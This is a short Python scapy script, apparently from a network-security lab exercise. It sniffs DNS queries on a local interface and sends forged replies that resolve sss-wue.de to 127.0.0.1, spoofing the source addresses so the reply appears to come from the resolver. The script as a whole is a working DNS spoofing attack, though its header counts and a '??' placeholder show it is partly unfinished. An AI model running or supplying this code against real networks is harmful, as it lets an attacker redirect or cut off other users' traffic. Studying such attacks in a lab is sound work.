from scapy.all import *
def spoof_dns(orig_pkt):
    if (DNS in orig_pkt and 'sss-wue.de' in orig_pkt[DNS].qd.qname.decode('utf-8')):
        a_rr = DNSRR(rrname='sss-wue.de', type='A', ttl=3600, rdata='127.0.0.1')
        # ns_rr=DNSRR(rrname='example.net', type='NS', ttl=3600, rdata='ns.example.net')

        dns = DNS(id=orig_pkt[DNS].id, qr=1, opcode=0,  # QR=1: Response, Opcode=0: Query
                  aa=1, tc=0, rd=0, ra=0, ad=0, cd=0, rcode=0,  # RCODE=0: NoError
                  qdcount=1, ancount=2, nscount=0, arcount=0,
                  qd=DNSQR(qname=orig_pkt[DNSQR].qname),
                  # an=a_rr/ns_rr,
                  # ns=??,
                  ar=a_rr)
        # For IP and UDP refer to Exercise 2 (dhcpstarv.py)
        ip = IP(src=orig_pkt[IP].dst, dst=orig_pkt[IP].src)
        udp = UDP(dport=orig_pkt[UDP].sport, sport=orig_pkt[UDP].dport)
        spoofed_pkt = ip/udp/dns
        print(spoofed_pkt.show())
        send(spoofed_pkt)

filter = "udp and dst port 53"
pkt = sniff(iface="eth1", filter=filter, prn=spoof_dns)